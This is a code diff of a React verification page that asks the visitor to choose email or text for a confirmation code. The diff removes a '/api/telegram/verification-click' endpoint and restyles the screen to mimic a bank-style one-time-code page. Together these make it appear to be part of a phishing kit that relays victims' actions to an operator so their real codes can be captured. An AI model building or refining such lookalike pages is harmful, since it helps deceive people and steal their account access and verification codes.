@@ -2,66 +2,33 @@
 
 import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
-import { Mail, Phone, Loader2 } from "lucide-react";
+import { Check, LockKeyhole, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
+import { VerificationHeader } from "@/components/verification-header";
 
 export default function VerifyChoicePage() {
   const router = useRouter();
   const [isLoading, setIsLoading] = useState(false);
-  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
+  const [selectedMethod, setSelectedMethod] = useState<"email" | "text">(
+    "email",
+  );
   const [email, setEmail] = useState<string>("");
-  const [phone, setPhone] = useState<string>("");
-  const [countdown, setCountdown] = useState(0);
-  const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
 
   // Mask email/phone on component mount (fetch from session/API if needed)
   useEffect(() => {
     // In a real app, you'd fetch these from your backend
     // For now, using placeholder masked values
-    setEmail("****@example.com");
-    setPhone("***-***-****");
+    setEmail("*******@*****");
   }, []);
-
-  const maskEmail = (email: string) => {
-    const parts = email.split("@");
-    if (parts.length !== 2) return email;
-    const localPart = parts[0];
-    const masked =
-      localPart.substring(0, 1) +
-      "*".repeat(Math.max(0, localPart.length - 2)) +
-      localPart.substring(localPart.length - 1);
-    return masked + "@" + parts[1];
-  };
-
-  const maskPhone = (phone: string) => {
-    const digits = phone.replace(/\D/g, "");
-    if (digits.length < 10) return phone;
-    return "*".repeat(3) + "-*".repeat(3) + "-" + digits.slice(-4);
-  };
 
   const handleSelect = async (method: "email" | "text") => {
     if (isLoading) return;
     setSelectedMethod(method);
     setIsLoading(true);
-    setCountdown(10);
-
-    countdownRef.current = window.setInterval(() => {
-      setCountdown((prev) => {
-        if (prev <= 1) {
-          if (countdownRef.current) {
-            window.clearInterval(countdownRef.current);
-            countdownRef.current = null;
-          }
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
 
     try {
-      await fetch("/api/telegram/verification-click", {
+      await fetch("/api/verification-click", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -79,102 +46,80 @@ export default function VerifyChoicePage() {
 
   useEffect(() => {
     return () => {
-      if (countdownRef.current) window.clearInterval(countdownRef.current);
       if (redirectRef.current) window.clearTimeout(redirectRef.current);
     };
   }, []);
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
-      <div className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-md">
-          {/* Message */}
-          <p className="text-center text-gray-700 mb-8">
-            We found you! Pick a method to receive a verification code now.
+    <div className="min-h-screen bg-white flex flex-col border-t border-gray-200">
+      <VerificationHeader />
+      <div className="flex-1 px-5 py-12 md:px-7 md:py-12">
+        <div className="w-full max-w-100 text-center">
+          <LockKeyhole className="mx-auto mb-2 h-11 w-11 stroke-[1.25] text-[#4f7390]" />
+          <p className="mb-4 text-sm leading-[1.15] text-gray-600">
+            Protecting your information is our first priority. In order to
+            access this site or perform this specific function you must receive
+            a confirmation code to the device of your choice. You will be asked
+            to enter the code on the next screen.
           </p>
 
-          {/* Email Option */}
-          <div className="flex items-center justify-between gap-4 mb-6">
-            <div className="flex items-center gap-3 flex-1">
-              <Mail className="w-5 h-5 text-gray-600 shrink-0" />
-              <span className="text-gray-700">Send code to email: {email}</span>
-            </div>
-            <Button
-              type="button"
-              disabled={isLoading}
-              onClick={() => handleSelect("email")}
-              className={`shrink-0 ${
-                selectedMethod === "email" && isLoading
-                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
-                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
-              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
+          <div className="mb-4 flex items-center gap-3 text-left">
+            <label
+              htmlFor="confirmation-method"
+              className="w-42.5 shrink-0 text-sm text-gray-700"
             >
-              {selectedMethod === "email" && isLoading ? (
-                <Loader2 className="w-4 h-4 animate-spin" />
-              ) : (
-                <Mail className="w-4 h-4" />
-              )}
-              E-MAIL
-            </Button>
+              Confirmation Code
+            </label>
+            <select
+              id="confirmation-method"
+              value={selectedMethod}
+              onChange={(event) =>
+                setSelectedMethod(event.target.value as "email" | "text")
+              }
+              disabled={isLoading}
+              className="h-9 min-w-0 flex-1 border border-gray-500 bg-white px-2 text-sm text-gray-700 outline-none focus:border-[#315778]"
+            >
+              <option value="email">Email</option>
+              <option value="text">Text</option>
+            </select>
           </div>
 
-          {/* Phone Option */}
-          <div className="flex items-center justify-between gap-4 mb-8">
-            <div className="flex items-center gap-3 flex-1">
-              <Phone className="w-5 h-5 text-gray-600 shrink-0" />
-              <span className="text-gray-700">Send code via text: {phone}</span>
-            </div>
-            <Button
-              type="button"
-              disabled={isLoading}
-              onClick={() => handleSelect("text")}
-              className={`shrink-0 ${
-                selectedMethod === "text" && isLoading
-                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
-                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
-              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
-            >
-              {selectedMethod === "text" && isLoading ? (
-                <Loader2 className="w-4 h-4 animate-spin" />
-              ) : (
-                <Phone className="w-4 h-4" />
-              )}
-              TEXT
-            </Button>
-          </div>
+          <input
+            aria-label="Masked confirmation destination"
+            value={selectedMethod === "email" ? email : "***-***-****"}
+            readOnly
+            className="mb-4 ml-42.5 block h-9 w-[calc(100%-170px)] border border-gray-400 bg-gray-50 px-2 text-sm text-gray-400 outline-none"
+          />
 
-          {/* Buttons */}
-          <div className="flex items-center gap-3 mb-6">
+          <div className="ml-22.5 flex w-52 flex-col gap-2 text-sm">
             <Button
               type="button"
-              variant="outline"
               disabled={isLoading}
-              className="flex-1 rounded bg-gray-200 hover:bg-gray-300 text-gray-800 border-gray-300 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
+              className="h-10 justify-start rounded-none border-0 bg-[#686868] px-3 font-normal text-white hover:bg-[#555] disabled:opacity-70"
               onClick={() => router.push("/")}
             >
-              ✕ CANCEL
+              <X className="mr-7 h-7 w-7 stroke-[1.25]" /> CANCEL
             </Button>
             <Button
               type="button"
-              variant="outline"
               disabled={isLoading}
-              className="flex-1 rounded bg-gray-300 hover:bg-gray-400 text-gray-800 border-gray-400 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
-              onClick={() => router.back()}
+              className="h-10 justify-start rounded-none border-0 bg-[#111e58] px-3 font-normal text-white hover:bg-[#0b1644] disabled:opacity-70"
+              onClick={() => handleSelect(selectedMethod)}
             >
-              ← BACK
+              <Check className="mr-5 h-7 w-7 stroke-[1.25]" />
+              {isLoading ? "GENERATING CODE" : "GENERATE CODE"}
             </Button>
           </div>
 
-          {/* Help Link */}
-          <div className="text-center">
-            <button
-              type="button"
-              className="text-blue-500 hover:underline text-sm"
-              onClick={() => router.push("/forgot-password")}
-            >
-              I cannot receive a verification code
-            </button>
+          <div className="mt-2 flex items-center bg-[#f2f6a0] px-2 py-3 text-left text-sm leading-[1.15] text-gray-700">
+            <span className="mr-3 flex h-8 w-8 shrink-0 items-center justify-center rounded-full border border-gray-500 text-xl font-light text-gray-600">
+              i
+            </span>
+            <p>
+              To proceed, please press the generate code button.If you wish to
+              cancel, you will be asked to enter a code the next time you login
+              or try to perform this specific function.
+            </p>
           </div>
         </div>
       </div>
